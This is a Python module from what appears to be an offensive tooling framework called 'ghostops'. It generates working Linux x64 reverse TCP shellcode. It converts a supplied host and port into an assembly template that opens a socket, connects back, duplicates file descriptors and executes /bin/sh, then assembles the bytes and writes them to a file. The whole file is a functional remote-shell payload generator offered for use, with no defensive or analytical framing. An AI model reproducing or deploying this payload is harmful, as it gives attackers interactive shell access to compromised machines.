from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KsError
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger
from pathlib import Path


class LinuxX64ShellReverseTcp(BaseModule):
    """
    Module to generate a raw reverse TCP shellcode payload targeting Linux x64.

    This payload connects back to a specified host and port.
    """

    module_name = "LinuxX86ReverseTcp"
    module_description = "Generates reverse TCP payload targeting Linux x64 platforms."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "payload"
    module_target_os = ["linux"]
    module_target_architecture = ["x64"]

    @staticmethod
    def add_arguments(parser) -> None:
        """
        Adds command-line arguments for host, port, and output file.

        Args:
            parser (argparse.ArgumentParser): Argument parser instance.
        """
        parser.add_argument(
            "--host", required=True, type=str, help="Target host IPv4 address"
        )
        parser.add_argument(
            "--port", required=True, type=int, help="Target port number"
        )
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def host_to_hex(host: str) -> str:
        """
        Converts an IPv4 address string into a reversed hex string.

        Args:
            host (str): IPv4 address, e.g., "192.168.1.1".

        Returns:
            str: Reversed hexadecimal representation of the IP address.

        Raises:
            ValueError: If the host is not a valid IPv4 address.
        """
        try:
            octets = host.split(".")
            if len(octets) != 4:
                raise ValueError("Invalid IPv4 address format")
            # Reverse octets for little-endian order and convert each to two-digit hex
            return "".join(f"{int(octet):02x}" for octet in reversed(octets))
        except Exception as e:
            Logger.log("flaw", f"Invalid host '{host}': {e}")
            raise

    @staticmethod
    def port_to_hex(port: int) -> str:
        """
        Converts a port number into a little-endian hex string.

        Args:
            port (int): TCP port number.

        Returns:
            str: Little-endian hex string representation of the port.

        Raises:
            ValueError: If port is outside valid range (1-65535).
        """
        if not (0 < port < 65536):
            raise ValueError(f"Port number must be between 1 and 65535, got {port}")
        # Little-endian conversion: low byte first, then high byte
        return f"{port & 0xFF:02x}{(port >> 8) & 0xFF:02x}"

    @staticmethod
    def main(args) -> None:
        """
        Main execution: assembles and writes raw shellcode with reverse TCP payload.

        Args:
            args: Parsed CLI arguments containing host, port, output file path.
        """
        Logger.log("info", f"HOST {args.host}")
        Logger.log("info", f"PORT {args.port}")
        print()

        try:
            host_hex = LinuxX64ShellReverseTcp.host_to_hex(args.host)
            port_hex = LinuxX64ShellReverseTcp.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        # Assembly template with placeholders for IP and port (little-endian)
        shellcode_template = f"""
        push   0x29
        pop    rax
        cdq
        push   0x2
        pop    rdi
        push   0x1
        pop    rsi
        syscall
        xchg   rdi,rax
        movabs rcx,0x{host_hex}{port_hex}0002
        push   rcx
        mov    rsi,rsp
        push   0x10
        pop    rdx
        push   0x2a
        pop    rax
        syscall
        push   0x3
        pop    rsi
        dec    rsi
        push   0x21
        pop    rax
        syscall
        jne    0x27
        push   0x3b
        pop    rax
        cdq
        movabs rbx,0x68732f6e69622f
        push   rbx
        mov    rdi,rsp
        push   rdx
        push   rdi
        mov    rsi,rsp
        syscall
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
